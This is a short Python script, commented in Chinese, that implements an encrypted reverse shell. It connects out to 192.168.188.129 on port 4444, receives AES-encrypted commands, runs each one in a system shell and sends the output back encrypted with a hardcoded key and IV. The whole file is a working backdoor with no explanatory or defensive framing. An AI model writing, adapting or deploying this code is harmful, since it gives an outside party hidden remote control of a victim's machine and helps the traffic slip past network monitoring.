#coding=utf-8

from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
import socket
import subprocess

key = b"K" * 32 # 32 字节（256 bit）密钥
IV = b"I" * 16 # 16 字节 初始变量

def encrypt(message):
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

def connect(host, port):
    s = socket.socket()
    s.connect((host, port))
    print('Connected to host {} and port {}'.format(host, port))
    while True:
        command = decrypt(s.recv(1024))
        if 'quit' in command.decode():
             break
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            s.send(encrypt(CMD.stdout.read()))
            

def main():
    connect('192.168.188.129',4444)
main()
